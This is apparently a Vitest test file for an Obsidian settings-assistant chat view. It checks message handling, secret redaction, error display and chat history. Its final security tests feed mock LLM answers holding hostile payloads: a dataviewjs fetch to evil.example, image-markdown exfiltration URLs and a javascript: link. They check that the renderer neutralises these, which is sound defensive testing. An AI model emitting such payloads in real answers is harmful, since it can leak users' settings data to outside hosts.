import { beforeAll, describe, expect, it, vi } from "vitest";
import "../src/i18n/strings";
import { WorkspaceLeaf } from "./vendor/kit/obsidian-mock";
import { SettingsChatHost, VIEW_TYPE_SA_CHAT, newChatState, refreshChatViews, type ChatHostDeps, type ChatState } from "../src/obsidian/chat-host";
import type { ChatSendHandlers, ChatSendResult } from "../src/vendor/kit-obsidian/chat-window";

// Das Kit-Fenster nimmt seine Uhr aus `window` (Renderer); die Testumgebung ist Node.
beforeAll(() => { vi.stubGlobal("window", globalThis); });

const installed = [{ id: "koda-agent", name: "Koda" }, { id: "lingotuner", name: "Lingotuner" }];
const F = "`".repeat(3);
const profile = JSON.stringify({ version: 1, plugins: { "koda-agent": { maxRounds: 20 } } });
const profileAnswer = `Try this:\n${F}settings-profile\n${profile}\n${F}\nDone.`;
const broken = `${F}settings-profile\n{oops sk-DETAIL-LEAK\n${F}`;

type Complete = (req: { messages: Array<{ role: string; content: unknown }> }, h: ChatSendHandlers) => Promise<ChatSendResult>;

function setup(opts: { endpoint?: boolean; answer?: string; complete?: Complete; state?: ChatState; readSettings?: ChatHostDeps["readSettings"] } = {}) {
  const flag = { ok: opts.endpoint ?? true };
  const complete = vi.fn<Complete>(opts.complete ?? (async (_req, h) => { h.onToken("hi"); return { ok: true, content: opts.answer ?? "plain answer" }; }));
  const models = vi.fn(async () => ({ models: ["m1", "m2"], reachable: true }));
  const setModel = vi.fn(async (_m: string) => {});
  const llm = { complete, models, setModel, modelInUse: () => "m1", source: () => ({ family: null, model: "m1", sentModel: "m1" }) };
  const service = { plan: vi.fn(async () => []), applyInteractive: vi.fn(async () => ({ cancelled: true as const })) };
  const state = opts.state ?? newChatState();
  const deps: ChatHostDeps = {
    app: { plugins: { plugins: {} } } as never,
    llm: llm as never,
    state, service, installed: () => installed,
    readSettings: opts.readSettings ?? (async () => JSON.stringify({ apiKey: "sk-SECRET-VALUE", maxRounds: 5 })),
    describeEndpoint: () => ({ endpoint: "http://x", model: "m1" }),
    resolveEndpoint: async () => flag.ok,
    openOwnSettings: vi.fn(), openPluginSettings: vi.fn(),
    renderMarkdown: vi.fn(async (el: HTMLElement, md: string) => { el.setText(md); }),
    saveNote: vi.fn(async () => "Settings profile.md"),
    thinking: { family: () => null, current: () => "off", onLevel: () => "low", setLevel: async () => {}, levelPicker: () => false,
      strings: { button: () => "Thinking: off", level: (l) => l, pickerLabel: "Thinking level" } },
    now: () => new Date(2026, 9, 3, 12, 0),
    domGuard: false,
  };
  const view = new SettingsChatHost(new WorkspaceLeaf() as never, deps);
  return { view, deps, state, service, flag, complete, llm };
}
type Setup = ReturnType<typeof setup>;
const el = (v: SettingsChatHost) => v.contentEl as any;
const all = (v: SettingsChatHost, sel: string) => el(v).querySelectorAll(sel) as any[];
const buttons = (v: SettingsChatHost) => all(v, "button");
const text = (v: SettingsChatHost) => el(v).textContent as string;
const ask = async (v: SettingsChatHost, q = "koda-agent rounds") => { await v.submit(q); };
const openWith = async (o: Parameters<typeof setup>[0] = {}): Promise<Setup> => { const s = setup(o); await s.view.onOpen(); return s; };
const key = (input: any, k: string, mods: Record<string, boolean> = {}) => {
  const ev = { type: "keydown", key: k, shiftKey: false, metaKey: false, ctrlKey: false, altKey: false, isComposing: false, defaultPrevented: false, preventDefault() { this.defaultPrevented = true; }, ...mods };
  input.dispatchEvent(ev);
  return ev;
};
const tick = (): Promise<void> => new Promise((r) => setTimeout(r, 0));
const lastMarkdown = (s: Setup): string => (s.deps.renderMarkdown as any).mock.calls.at(-1)[1] as string;

describe("chat-host", () => {
  it("Typ-Konstante", () => { expect(VIEW_TYPE_SA_CHAT).toBe("settings-assistant-chat"); });

  it("die Frage geht mit System-Prompt und Kontext an die Verbindung, Signal und Handler sind die des Fensters", async () => {
    const s = await openWith({ answer: "ok" });
    await ask(s.view, "koda-agent rounds");
    const [req, h] = s.complete.mock.calls[0]!;
    expect(req.messages.map((m) => m.role)).toEqual(["system", "user"]);
    expect(String(req.messages[1]!.content)).toContain("### plugins.koda-agent");
    expect(String(req.messages[1]!.content).endsWith("\n\nkoda-agent rounds")).toBe(true);
    expect(h.signal.aborted).toBe(false);
    expect(typeof h.onToken).toBe("function");
  });

  it("Enter in der Eingabe sendet, Umschalt+Enter nicht", async () => {
    const s = await openWith({ answer: "ok" });
    const input = all(s.view, ".okit-chat-input")[0];
    input.value = "koda-agent rounds";
    expect(key(input, "Enter", { shiftKey: true }).defaultPrevented).toBe(false);
    expect(s.complete).not.toHaveBeenCalled();
    expect(key(input, "Enter").defaultPrevented).toBe(true);
    await vi.waitFor(() => { expect(s.complete).toHaveBeenCalledTimes(1); });
  });

  it("Escape bricht einen laufenden Lauf ab: Signal abgebrochen, „Stopped.“ unter der Antwort", async () => {
    const s = await openWith({ complete: (_r, h) => new Promise((resolve) => { h.signal.addEventListener("abort", () => { resolve({ ok: false, kind: "aborted" }); }); }) });
    const pending = ask(s.view);
    await vi.waitFor(() => { expect(s.complete).toHaveBeenCalled(); });
    key(all(s.view, ".okit-chat-input")[0], "Escape");
    await pending;
    expect(s.complete.mock.calls[0]![1].signal.aborted).toBe(true);
    expect(text(s.view)).toContain("Stopped.");
  });

  describe("Leerzustand ohne Endpunkt", () => {
    it("genau ein mod-cta, der die Einstellungen öffnet; weder Modellzeile noch Textfeld sichtbar gebaut", async () => {
      const s = await openWith({ endpoint: false });
      expect(all(s.view, ".okit-chat-empty").length).toBe(1);
      const cta = all(s.view, ".okit-chat-empty")[0].querySelectorAll(".mod-cta");
      expect(cta.length).toBe(1);
      expect(cta[0].textContent).toBe("Set up a chat model");
      cta[0].click();
      expect(s.deps.openOwnSettings).toHaveBeenCalled();
      expect(all(s.view, ".okit-model-bar").length).toBe(0);
    });

    it("wechselt nach der Auflösung des Endpunkts in den Chat; refreshChatViews erreicht alle offenen Ansichten", async () => {
      const s = await openWith({ endpoint: false });
      expect(all(s.view, ".okit-model-bar").length).toBe(0);
      s.flag.ok = true;
      const leaf = new WorkspaceLeaf() as any;
      leaf.view = s.view;
      await refreshChatViews([leaf, new WorkspaceLeaf() as never]);
      expect(all(s.view, ".okit-model-bar").length).toBe(1);
      expect(all(s.view, ".okit-chat-empty").every((e) => e.hasClass("okit-chat-hidden"))).toBe(true);
    });
  });

  describe("Modellzeile", () => {
    it("steht im Kopf des Fensters, mit dem Namen der Aufgabe, und die Denk-Steuerung ist in ihr (kein zweiter Knopf)", async () => {
      const s = await openWith();
      const header = all(s.view, ".okit-chat-header")[0];
      expect(header.querySelectorAll(".okit-model-bar").length).toBe(1);
      expect(header.querySelector(".okit-model-bar-label").textContent).toBe("Chat");
      expect(all(s.view, ".okit-thinking-control").length).toBe(1);
      expect(all(s.view, ".okit-model-bar")[0].querySelectorAll(".okit-thinking-control").length).toBe(1);
      expect(all(s.view, ".sa-chat-head").length).toBe(0);
    });

    it("ein Wechsel im Dropdown ruft setModel der Verbindung", async () => {
      const s = await openWith();
      const select = all(s.view, ".okit-model-bar-select")[0];
      await vi.waitFor(() => { expect(select.querySelectorAll("option").length).toBeGreaterThan(2); });
      select.value = "m2";
      select.dispatchEvent({ type: "change" });
      await vi.waitFor(() => { expect(s.llm.setModel).toHaveBeenCalledWith("m2"); });
    });

    it("sperrt sich während eines Laufs und gibt sich danach frei", async () => {
      let release: (r: ChatSendResult) => void = () => {};
      const s = await openWith({ complete: () => new Promise((resolve) => { release = resolve; }) });
      const select = (): any => all(s.view, ".okit-model-bar-select")[0];
      expect(select().disabled ?? false).toBe(false);
      const pending = ask(s.view);
      await vi.waitFor(() => { expect(s.complete).toHaveBeenCalled(); });
      expect(select().disabled).toBe(true);
      release({ ok: true, content: "fertig" });
      await pending;
      expect(select().disabled ?? false).toBe(false);
    });

    it("reload bei unverändertem Endpunkt-Zustand zeichnet nur die Zeile neu, der Entwurf bleibt", async () => {
      let label = "Thinking: off";
      const fresh = setup();
      (fresh.deps.thinking as any).strings.button = () => label;
      await fresh.view.onOpen();
      const input = all(fresh.view, ".okit-chat-input")[0];
      input.value = "halber Entwurf";
      expect(text(fresh.view)).toContain("Thinking: off");
      label = "Thinking: low";
      await fresh.view.reload();
      expect(text(fresh.view)).toContain("Thinking: low");
      expect(all(fresh.view, ".okit-chat-input")[0]).toBe(input);
      expect(input.value).toBe("halber Entwurf");
    });

    it("reload mit models lädt die Modell-Liste neu", async () => {
      const s = await openWith();
      await tick();
      const before = s.llm.models.mock.calls.length;
      await s.view.reload({ models: true });
      await tick();
      expect(s.llm.models.mock.calls.length).toBeGreaterThan(before);
    });
  });

  describe("Unter der Antwort", () => {
    it("Sent context enthält Namen, aber keinen geheimen Wert", async () => {
      const s = await openWith();
      await ask(s.view);
      expect(text(s.view)).toContain("Sent context");
      expect(text(s.view)).toContain("plugins.koda-agent.apiKey");
      expect(text(s.view)).not.toContain("sk-SECRET-VALUE");
      expect(text(s.view)).toContain("http://x");
    });

    it("ein Vorschlagsblock rendert den Apply-Knopf und die Speichern-Aktion; der Block steht nicht noch einmal als Rohtext im Markdown", async () => {
      const s = await openWith({ answer: profileAnswer });
      await ask(s.view);
      await vi.waitFor(() => { expect(all(s.view, ".sa-apply").length).toBe(1); });
      expect(all(s.view, ".sa-apply")[0].textContent).toContain("Apply");
      const save = buttons(s.view).find((b) => b.textContent === "Save as profile note");
      expect(save).toBeTruthy();
      expect(lastMarkdown(s)).not.toContain("settings-profile");
      save.click();
      await vi.waitFor(() => { expect(s.deps.saveNote).toHaveBeenCalled(); });
    });

    it("Speichern schwärzt Geheimnisse im Block", async () => {
      const leaky = `${F}settings-profile\n` + JSON.stringify({ version: 1, plugins: { "koda-agent": { apiKey: "sk-LLM-MADE" } } }) + `\n${F}`;
      const s = await openWith({ answer: leaky });
      await ask(s.view);
      await vi.waitFor(() => { expect(buttons(s.view).some((b) => b.textContent === "Save as profile note")).toBe(true); });
      buttons(s.view).find((b) => b.textContent === "Save as profile note").click();
      await vi.waitFor(() => { expect(s.deps.saveNote).toHaveBeenCalled(); });
      const [name, saved] = (s.deps.saveNote as any).mock.calls[0];
      expect(name).toBe("Settings profile 2026-10-03 12-00");
      expect(saved).not.toContain("sk-LLM-MADE");
    });

    it("gültiger Block: roher Block geschwärzt im <details>, kein Geheimnis", async () => {
      const leaky = `${F}settings-profile\n` + JSON.stringify({ version: 1, plugins: { "koda-agent": { apiKey: "sk-LLM-MADE", maxRounds: 20 } } }) + `\n${F}`;
      const s = await openWith({ answer: leaky });
      await ask(s.view);
      await vi.waitFor(() => { expect(all(s.view, ".sa-chat-raw").length).toBe(1); });
      const raw = all(s.view, ".sa-chat-raw")[0];
      expect(raw.tagName.toLowerCase()).toBe("details");
      expect(raw.textContent).toContain("Raw block (secrets redacted)");
      const pre = raw.querySelectorAll("pre")[0];
      expect(pre.textContent).toContain("🔒");
      expect(pre.textContent).toContain("maxRounds");
      expect(text(s.view)).not.toContain("sk-LLM-MADE");
    });

    it("ungültiger Block: Hinweis statt Rohtext, und nur der Code-Text des Fehlers, nie das Detail", async () => {
      const s = await openWith({ answer: broken });
      await ask(s.view);
      await vi.waitFor(() => { expect(all(s.view, ".sa-chat-raw").length).toBe(1); });
      const pre = all(s.view, ".sa-chat-raw")[0].querySelectorAll("pre")[0];
      expect(pre.textContent).toBe("(block is not valid JSON — not shown)");
      await vi.waitFor(() => { expect(all(s.view, ".sa-profile-error").length).toBe(1); });
      expect(text(s.view)).toContain("not valid JSON");
      expect(text(s.view)).not.toContain("oops");
      expect(text(s.view)).not.toContain("sk-DETAIL-LEAK");
    });

    it("gültiges JSON, aber kein gültiges Profil: geschwärzt gezeigt", async () => {
      const s = await openWith({ answer: `${F}settings-profile\n` + JSON.stringify({ plugins: { x: { token: "sk-NOVERSION" } } }) + `\n${F}` });
      await ask(s.view);
      await vi.waitFor(() => { expect(all(s.view, ".sa-chat-raw").length).toBe(1); });
      expect(all(s.view, ".sa-chat-raw")[0].querySelectorAll("pre")[0].textContent).toContain("🔒");
      expect(text(s.view)).not.toContain("sk-NOVERSION");
    });

    it("an einer gescheiterten Runde gibt es keinen Apply-Knopf, auch wenn der Teiltext einen geschlossenen Zaun trägt; „Sent context“ bleibt", async () => {
      const s = await openWith({ complete: async (_r, h) => { h.onToken(profileAnswer); return { ok: false, kind: "network" }; } });
      await ask(s.view);
      expect(all(s.view, ".okit-chat-error").length).toBe(1);
      expect(all(s.view, ".sa-apply").length).toBe(0);
      expect(all(s.view, ".sa-chat-raw").length).toBe(0);
      expect(text(s.view)).toContain("Sent context");
    });

    it("an einer abgebrochenen Runde gibt es keinen Apply-Knopf", async () => {
      const s = await openWith({ complete: (_r, h) => new Promise((resolve) => { h.onToken(profileAnswer); h.signal.addEventListener("abort", () => { resolve({ ok: false, kind: "aborted" }); }); }) });
      const pending = ask(s.view);
      await vi.waitFor(() => { expect(s.complete).toHaveBeenCalled(); });
      await tick();
      key(all(s.view, ".okit-chat-input")[0], "Escape");
      await pending;
      expect(all(s.view, ".sa-apply").length).toBe(0);
    });
  });

  describe("Fehler", () => {
    it("ein HTTP-Fehler zeigt die Begründung des Servers in der Fehlerzeile (Entscheidung Johannes 2026-10-11), wendet nichts an", async () => {
      const s = await openWith({ complete: async () => ({ ok: false, kind: "http", status: 500, body: '{"error":{"message":"model crashed"}}' }) });
      await ask(s.view);
      const line = all(s.view, ".okit-chat-error")[0].textContent as string;
      expect(line).toContain("HTTP 500");
      expect(line).toContain("model crashed");
      expect(s.service.applyInteractive).not.toHaveBeenCalled();
    });

    it("bei anderen Fehlern erscheinen weder Detail noch Body des Servers", async () => {
      const s = await openWith({ complete: async () => ({ ok: false, kind: "timeout", detail: "no data for 600s sk-DETAIL-LEAK", body: "BODY-LEAK" }) });
      await ask(s.view);
      expect(all(s.view, ".okit-chat-error").length).toBe(1);
      expect(text(s.view)).not.toContain("sk-DETAIL-LEAK");
      expect(text(s.view)).not.toContain("BODY-LEAK");
    });

    it("an der gescheiterten Runde steht „Send again“; der Klick sendet dieselbe Frage erneut", async () => {
      let n = 0;
      const s = await openWith({ complete: async () => (++n === 1 ? { ok: false, kind: "network" } : { ok: true, content: "jetzt" }) });
      await ask(s.view, "koda-agent rounds");
      const retry = all(s.view, ".okit-chat-retry")[0];
      expect(retry.textContent).toBe("Send again");
      retry.click();
      await vi.waitFor(() => { expect(s.complete).toHaveBeenCalledTimes(2); });
      await vi.waitFor(() => { expect(all(s.view, ".okit-chat-error").length).toBe(0); });
      // die gescheiterte Runde ging nicht ans Modell: beide Aufrufe tragen genau eine Frage
      expect(s.complete.mock.calls[1]![0].messages.filter((m) => m.role === "user")).toHaveLength(1);
    });
  });

  describe("Plugin-Auswahl (Chips)", () => {
    it("sind entfernbar, ohne dass die Bereiche unter den Antworten neu gebaut werden", async () => {
      const s = await openWith({ answer: profileAnswer });
      s.state.selected = ["koda-agent", "lingotuner"];
      await ask(s.view);
      await vi.waitFor(() => { expect(all(s.view, ".sa-apply").length).toBe(1); });
      const apply = all(s.view, ".sa-apply")[0];
      const rm = buttons(s.view).filter((b) => b.getAttribute("aria-label") === "Remove Koda");
      expect(rm.length).toBe(1);
      rm[0].click();
      expect(s.state.selected).toEqual(["lingotuner"]);
      expect(all(s.view, ".sa-apply")[0]).toBe(apply);
    });

    it("eine weitere Frage baut die Bereiche unter früheren Antworten nicht neu: „gespeichert“ an einem Vorschlagsblock bleibt stehen", async () => {
      const s = await openWith({ answer: profileAnswer });
      await ask(s.view, "koda-agent rounds");
      await vi.waitFor(() => { expect(buttons(s.view).some((b) => b.textContent === "Save as profile note")).toBe(true); });
      buttons(s.view).find((b) => b.textContent === "Save as profile note").click();
      await vi.waitFor(() => { expect(all(s.view, ".sa-chat-block-info").length).toBeGreaterThan(0); });
      await ask(s.view, "und noch eine Frage");
      expect(text(s.view)).toContain("Saved profile note: Settings profile.md");
    });

    it("werden bei leerer Auswahl aus der ersten Frage vorbelegt und bleiben für die nächste", async () => {
      const s = await openWith();
      await ask(s.view, "change Koda please");
      expect(s.state.selected).toEqual(["koda-agent"]);
      expect(buttons(s.view).some((b) => b.getAttribute("aria-label") === "Remove Koda")).toBe(true);
      await ask(s.view, "und noch etwas anderes");
      expect(s.state.selected).toEqual(["koda-agent"]);
    });
  });

  describe("Verlauf", () => {
    it("überlebt das Schließen und Öffnen der Ansicht (der Zustand gehört dem Plugin)", async () => {
      const state = newChatState();
      const a = await openWith({ state, answer: "erste Antwort" });
      await ask(a.view, "koda-agent erste Frage");
      await a.view.onClose();
      const b = await openWith({ state });
      expect(text(b.view)).toContain("koda-agent erste Frage");
      expect(text(b.view)).toContain("erste Antwort");
    });

    it("die zweite Runde trägt die erste ohne Kontext, den Kontext nur in der letzten Nutzernachricht", async () => {
      const s = await openWith({ answer: "antwort" });
      await ask(s.view, "koda-agent eins");
      await ask(s.view, "zwei");
      const msgs = s.complete.mock.calls[1]![0].messages;
      expect(msgs.map((m) => m.role)).toEqual(["system", "user", "assistant", "user"]);
      expect(msgs[1]!.content).toBe("koda-agent eins");
      expect(String(msgs[3]!.content)).toContain("### plugins.koda-agent");
    });
  });

  describe("Sicherheit der Antwort", () => {
    it("(I2) fremde Codeblock-Tags und Inline-Abfragen erreichen den Renderer nicht", async () => {
      const evil = `Look:\n${F}dataviewjs\nfetch("https://evil.example")\n${F}\nand \`$= dv.pages()\`\n${F} settings-profile\n{"version":1}\n${F}`;
      const s = await openWith({ answer: evil });
      await ask(s.view);
      await vi.waitFor(() => { expect((s.deps.renderMarkdown as any).mock.calls.length).toBeGreaterThan(0); });
      const md = lastMarkdown(s);
      expect(md).not.toContain("`");
      expect(md).toContain("ˋˋˋdataviewjs");
      expect(md).not.toContain("settings-profile");
    });

    it("Bild-URL in der Antwort erreicht den Renderer nie als Bildsyntax", async () => {
      const s = await openWith({ answer: 'look ![x](https://evil.example/?q=maxRounds5) <img src="https://evil.example/a">' });
      await ask(s.view);
      await vi.waitFor(() => { expect(s.deps.renderMarkdown).toHaveBeenCalled(); });
      expect(lastMarkdown(s)).not.toContain("![");
      expect(lastMarkdown(s)).not.toContain("<img");
      expect(text(s.view)).not.toContain("![");
    });

    it("ein unvollständiger Profilzaun wird nicht gerendert", async () => {
      const s = await openWith({ answer: `hi\n${F}settings-profile\n{"version":1` });
      await ask(s.view);
      await vi.waitFor(() => { expect(s.deps.renderMarkdown).toHaveBeenCalled(); });
      expect(lastMarkdown(s)).not.toContain("settings-profile");
    });

    it("(I2) ein nicht erkannter Profilzaun (im Zitat) wird nie ein Block des eigenen Prozessors", async () => {
      const s = await openWith({ answer: `hi\n> ${F}settings-profile\n> {"version":1}\n> ${F}` });
      await ask(s.view);
      await vi.waitFor(() => { expect(s.deps.renderMarkdown).toHaveBeenCalled(); });
      expect(lastMarkdown(s)).not.toContain("`");
    });

    // Das Kit wendet `answerTransform` je stabilem Abschnitt an und erkennt Zäune nur bis 3 Leerzeichen Einzug und ohne Zaunlänge,
    // `findProfileFences` ist großzügiger. Bleibt das JSON eines Zauns als Rohtext sichtbar, ist das ein Befund für das Kit.
    it.each([
      ["Leerzeile im Block", `davor\n\n${F}settings-profile\n{"version":1,\n\n"plugins":{"koda-agent":{"maxRounds":20}}}\n${F}\n\ndanach`],
      ["vier Leerzeichen Einzug", `davor\n\n    ${F}settings-profile\n    ${profile}\n    ${F}\n\ndanach`],
      ["Tilden-Zaun der Länge vier", `davor\n\n~~~~settings-profile\n${profile}\n~~~~\n\ndanach`],
      ["Backtick-Zaun der Länge vier", `davor\n\n${F}\`settings-profile\n${profile}\n${F}\`\n\ndanach`],
    ])("Profil-Zaun mit %s: sein JSON erscheint nicht als Rohtext im gezeigten Markdown", async (_name, answer) => {
      const s = await openWith({ answer });
      await ask(s.view);
      await vi.waitFor(() => { expect(s.deps.renderMarkdown).toHaveBeenCalled(); });
      const shown = ((s.deps.renderMarkdown as any).mock.calls as Array<[unknown, string]>).map((c) => c[1]).join("\n");
      expect(shown).not.toContain("maxRounds");
      expect(shown).not.toContain('"version"');
    });

    it("der Renderer-Ausgang wird nach dem Rendern bereinigt (aktive Elemente weg)", async () => {
      const s = await openWith({ answer: "hello" });
      (s.deps.renderMarkdown as any).mockImplementation(async (e: any) => { e.createEl("img", { attr: { src: "https://evil/" } }); });
      await ask(s.view);
      await vi.waitFor(() => { expect(s.deps.renderMarkdown).toHaveBeenCalled(); });
      await tick();
      expect(all(s.view, "img").length).toBe(0);
    });

    it("Linkschutz: ein javascript:-Link in der gerenderten Antwort verliert sein href, der Linktext bleibt", async () => {
      const s = await openWith({ answer: "klick" });
      (s.deps.renderMarkdown as any).mockImplementation(async (e: any) => {
        e.createEl("a", { text: "böse", attr: { href: "javascript:alert(1)" } });
        e.createEl("a", { text: "gut", attr: { href: "https://example.org/x" } });
      });
      await ask(s.view);
      await vi.waitFor(() => { expect(all(s.view, "a").length).toBe(2); });
      await tick();
      const links = all(s.view, "a");
      expect(links.find((a) => a.textContent === "böse").getAttribute("href")).toBeNull();
      expect(links.find((a) => a.textContent === "gut").getAttribute("href")).toBe("https://example.org/x");
    });
  });
});
